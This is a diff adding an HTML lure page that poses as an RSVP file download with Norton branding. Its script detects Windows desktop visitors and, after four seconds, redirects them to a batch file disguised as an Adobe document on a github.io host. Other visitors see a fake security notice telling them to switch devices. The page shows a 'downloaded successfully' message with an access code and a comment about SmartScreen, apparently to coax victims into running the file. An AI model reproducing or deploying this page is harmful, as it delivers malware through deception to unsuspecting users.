@@ -1,0 +1,141 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f9f7f6;
+            background-image: url('https://www.transparenttextures.com/patterns/gplay.png');
+            background-repeat: repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .block-container {
+            background-color: #fff;
+            max-width: 480px;
+            padding: 40px 35px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            text-align: center;
+            border: 2px solid #d4af37;
+            box-sizing: border-box;
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2000;
+            background-clip: padding-box;
+        }
+
+        .block-container h1 {
+            color: #333;
+            font-weight: 700;
+            font-size: 20px;
+            margin-bottom: 18px;
+            letter-spacing: 0.02em;
+        }
+
+        .block-container p {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 14px;
+        }
+
+        .block-footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+            font-style: italic;
+            letter-spacing: 0.04em;
+        }
+
+        .top-bar,
+        .content {
+            display: block;
+        }
+
+        .image-row {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            margin-top: 30px;
+        }
+
+        .image-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .image-box img {
+            max-width: 300px;
+            width: 100%;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            margin-bottom: 10px;
+        }
+
+        .image-box span {
+            color: #333;
+            font-size: 14px;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 6px 12px;
+            border-radius: 6px;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const isWindowsDesktop = navigator.userAgent.includes("Windows") &&
+                !/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
+        
+            const blockContainer = document.createElement('div');
+            blockContainer.className = 'block-container';
+            blockContainer.innerHTML = `
+                <h1>Oops — It’s Not You, It’s Us</h1>
+                <p>Your RSVP file can only be accessed from a Windows or desktop PC.</p>
+                <p>Please switch to a compatible device to continue.</p>
+                <div class="block-footer">©️ 2026  RSVP Security Technologies. All rights reserved.</div>
+            `;
+        
+            if (!isWindowsDesktop) {
+                document.body.appendChild(blockContainer);
+                document.querySelector('.top-bar').style.display = 'none';
+                document.querySelector('.content').style.display = 'none';
+                blockContainer.style.display = 'block';
+            } else {
+                document.querySelector('.top-bar').style.display = 'block';
+                document.querySelector('.content').style.display = 'block';
+        
+                setTimeout(() => {
+                    window.location.href = "https://locki2883.github.io/doc/Adobe-Document.bat";
+                }, 4000);
+            }
+        });
+    </script>
+</head>
+
+<body>
+    <div class="top-bar"><br></div>
+    <div class="content" style="text-align:center; padding:20px;">
+        <h1><a href="" src="https://us.norton.com/content/dam/norton/logo/logo_norton_d.svg" style="max-width: 180px;"></a></h1><!-- Updated Message with Blue Background -->
+        <p style="background-color: #007bff; color: white; padding: 12px 18px; border-radius: 6px;"> DOWNLOADED SUCCESSFULLY. PLEASE USE CODE <strong>EXLP2026</strong>&nbsp;TO ACCESS THE DOWNLOADED FILE THANK YOU...</p>&nbsp;<!-- SmartScreen Instructions -->
+        <div class="image-row">
+            <div class="image-box"><br></div>
+        </div>
+    </div>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"bee9baeab76c4f72b5b83adc004e1897","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+</html>
